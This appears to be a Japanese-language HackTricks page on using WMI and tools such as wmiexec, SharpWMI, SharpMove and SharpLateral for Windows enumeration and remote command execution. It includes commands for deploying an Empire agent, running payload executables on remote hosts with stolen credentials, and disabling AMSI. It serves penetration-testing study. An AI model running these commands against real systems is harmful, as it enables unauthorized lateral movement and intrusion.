# WmiExec

{{#include ../../banners/hacktricks-training.md}}

## 仕組みの説明

ユーザー名とパスワードまたはハッシュが知られているホスト上でプロセスを開くことができます。WMIを使用してコマンドが実行され、Wmiexecによってセミインタラクティブなシェル体験が提供されます。

**dcomexec.py:** 異なるDCOMエンドポイントを利用して、このスクリプトはwmiexec.pyに似たセミインタラクティブなシェルを提供し、特にShellBrowserWindow DCOMオブジェクトを活用しています。現在、MMC20.アプリケーション、シェルウィンドウ、およびシェルブラウザウィンドウオブジェクトをサポートしています。(source: [Hacking Articles](https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/))

## WMIの基本

### 名前空間

ディレクトリスタイルの階層で構成されており、WMIの最上位コンテナは\rootで、その下に名前空間と呼ばれる追加のディレクトリが整理されています。
名前空間をリストするためのコマンド:
```bash
# Retrieval of Root namespaces
gwmi -namespace "root" -Class "__Namespace" | Select Name

# Enumeration of all namespaces (administrator privileges may be required)
Get-WmiObject -Class "__Namespace" -Namespace "Root" -List -Recurse 2> $null | select __Namespace | sort __Namespace

# Listing of namespaces within "root\cimv2"
Get-WmiObject -Class "__Namespace" -Namespace "root\cimv2" -List -Recurse 2> $null | select __Namespace | sort __Namespace
```
名前空間内のクラスは、次のようにリストできます:
```bash
gwmwi -List -Recurse # Defaults to "root\cimv2" if no namespace specified
gwmi -Namespace "root/microsoft" -List -Recurse
```
### **クラス**

WMIクラス名（例：win32_process）と、それが存在する名前空間を知ることは、すべてのWMI操作において重要です。  
`win32`で始まるクラスをリストするためのコマンド：
```bash
Get-WmiObject -Recurse -List -class win32* | more # Defaults to "root\cimv2"
gwmi -Namespace "root/microsoft" -List -Recurse -Class "MSFT_MpComput*"
```
クラスの呼び出し:
```bash
# Defaults to "root/cimv2" when namespace isn't specified
Get-WmiObject -Class win32_share
Get-WmiObject -Namespace "root/microsoft/windows/defender" -Class MSFT_MpComputerStatus
```
### 方法

WMI クラスの 1 つ以上の実行可能な関数であるメソッドは、実行できます。
```bash
# Class loading, method listing, and execution
$c = [wmiclass]"win32_share"
$c.methods
# To create a share: $c.Create("c:\share\path","name",0,$null,"My Description")
```

```bash
# Method listing and invocation
Invoke-WmiMethod -Class win32_share -Name Create -ArgumentList @($null, "Description", $null, "Name", $null, "c:\share\path",0)
```
## WMI列挙

### WMIサービスの状態

WMIサービスが稼働しているか確認するためのコマンド:
```bash
# WMI service status check
Get-Service Winmgmt

# Via CMD
net start | findstr "Instrumentation"
```
### システムおよびプロセス情報

WMIを通じてシステムおよびプロセス情報を収集する：
```bash
Get-WmiObject -ClassName win32_operatingsystem | select * | more
Get-WmiObject win32_process | Select Name, Processid
```
攻撃者にとって、WMIはシステムやドメインに関する機密データを列挙するための強力なツールです。
```bash
wmic computerystem list full /format:list
wmic process list /format:list
wmic ntdomain list /format:list
wmic useraccount list /format:list
wmic group list /format:list
wmic sysaccount list /format:list
```
WMIを使用して特定の情報、例えばローカル管理者やログイン中のユーザーをリモートで照会することは、慎重なコマンド構築によって実現可能です。

### **手動リモートWMI照会**

リモートマシン上のローカル管理者やログイン中のユーザーを stealthy に特定することは、特定のWMIクエリを通じて達成できます。`wmic`は、複数のノードでコマンドを同時に実行するためにテキストファイルからの読み取りもサポートしています。

WMIを介してプロセスをリモートで実行するためには、Empireエージェントを展開するなど、以下のコマンド構造が使用され、成功した実行は戻り値「0」で示されます：
```bash
wmic /node:hostname /user:user path win32_process call create "empire launcher string here"
```
このプロセスは、リモート実行とシステム列挙のためのWMIの能力を示しており、システム管理とペネトレーションテストの両方におけるその有用性を強調しています。

## 自動ツール

- [**SharpLateral**](https://github.com/mertdas/SharpLateral):
```bash
SharpLateral redwmi HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe
```
- [**SharpWMI**](https://github.com/GhostPack/SharpWMI)
```bash
SharpWMI.exe action=exec [computername=HOST[,HOST2,...]] command=""C:\\temp\\process.exe [args]"" [amsi=disable] [result=true]
# Stealthier execution with VBS
SharpWMI.exe action=executevbs [computername=HOST[,HOST2,...]] [script-specification] [eventname=blah] [amsi=disable] [time-specs]
```
- [**https://github.com/0xthirteen/SharpMove**](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=query computername=remote.host.local query="select * from win32_process" username=domain\user password=password
SharpMove.exe action=create computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true username=domain\user password=password
SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain\\user password=password
```
- **Impacketの`wmiexec`**を使用することもできます。


## 参考文献

- [https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-3-wmi-and-winrm/](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)


{{#include ../../banners/hacktricks-training.md}}
